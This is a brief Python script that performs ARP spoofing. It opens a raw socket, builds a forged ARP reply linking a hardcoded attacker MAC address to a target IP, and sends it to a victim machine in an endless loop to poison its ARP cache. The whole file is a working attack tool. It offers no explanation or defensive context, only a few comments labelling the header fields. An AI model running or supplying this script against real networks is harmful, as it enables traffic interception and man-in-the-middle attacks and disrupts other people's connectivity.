import socket
import struct
import binascii
import sys

# attckerMAC = sys.argv[1]
# victimMAC = sys.argv[2]
violated_ip = sys.argv[2]
victim_ip = sys.argv[1]

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
s.bind(("enp0s3",socket.htons(0x0800)))

#ARP packet header items

attckerMAC = '\x08\x00\x27\xd1\x34\x86'
victimMAC = '\x08\x00\x27\x34\xad\xad'

ethertype ='\x08\x06' #protocol type for Ethernet
#ethernet frame(dest mac+src mac+ethertype+payload)
ethernet1 = victimMAC + attckerMAC + ethertype

htype = '\x00\x01' #hardware type
protype = '\x08\x00' #protocol type for IPv4
hsize = '\x06' #hardware address length
psize = '\x04' #protocol address length
opcode = '\x00\x02' #code for ARP reply

violatedIP = socket.inet_aton ( violated_ip )
victimIP = socket.inet_aton ( victim_ip )
victim_ARP = ethernet1 + htype + protype + hsize + psize + opcode + attckerMAC + violatedIP + victimMAC + victimIP

while True:
   s.send(victim_ARP)
